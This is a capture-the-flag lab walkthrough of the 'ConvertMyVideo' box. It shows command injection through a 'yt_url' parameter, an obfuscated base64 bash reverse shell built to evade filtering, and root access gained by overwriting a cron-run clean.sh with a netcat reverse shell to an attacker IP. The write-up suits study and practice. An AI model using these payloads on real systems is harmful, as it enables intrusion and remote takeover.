# ConvertMyVideo

## Nmap

```
sudo nmap 10.10.50.86 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelP
```

Port 80 lands us on a Youtube video conversion page.

![](<../../../.gitbook/assets/image (1077).png>)

Running feroxbuster against the target website produces only a few results. Of which only the /admin directory is interesting. The /admin directory uses a HTTP-basic-form and I was unable to crack using rockyou.txt with common user names such as 'admin'.

![](<../../../.gitbook/assets/image (1078) (1).png>)

Running a generic query does not produces anything interesting.

![](<../../../.gitbook/assets/image (1079).png>)

Running the search query through Burpsuite gives us the parameter 'yt\_url'.

![](<../../../.gitbook/assets/image (1080).png>)

Referring against this link we can try various command injection techniques for valid parameters.

{% embed url="https://book.hacktricks.xyz/pentesting-web/command-injection" %}

As per the link trying the following gives us a command injection result:

```
yt_url=ls||id;
```

![](<../../../.gitbook/assets/image (1082).png>)

Knowing we can inject commands we can attempt a reverse shell by running the command below in a terminal on our attacking machine then taking the output and using it in our command injection

```
echo "echo $(echo 'bash -i >& /dev/tcp/10.14.3.108/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

![](<../../../.gitbook/assets/image (1083).png>)

Then paste the output into Burpsuite:

![](<../../../.gitbook/assets/image (1084) (1).png>)

Once sent we should receive a reverse shell on the `netcat` listener.

![](<../../../.gitbook/assets/image (1085).png>)

After looking about the machine and running enumeration scripts I was unable to identify any points of escalation. I then decided to run [pspy64](https://github.com/DominicBreuker/pspy/releases) to see if anything is being executed on a regular basis.

After transferring and running we get the following results:

![](<../../../.gitbook/assets/image (1086) (1) (1) (1).png>)

Frequently the following is being run:

`/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh`

From here I echo'd out the contents of clean.sh and replaced the contents with a `netcat` reverse shell.

```
echo  > clean.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.3.108 4444 >/tmp/f' > clean.sh
```

Then set up a listener on port 4444 waited a few seconds and received a shell as root.

![](<../../../.gitbook/assets/image (1089).png>)
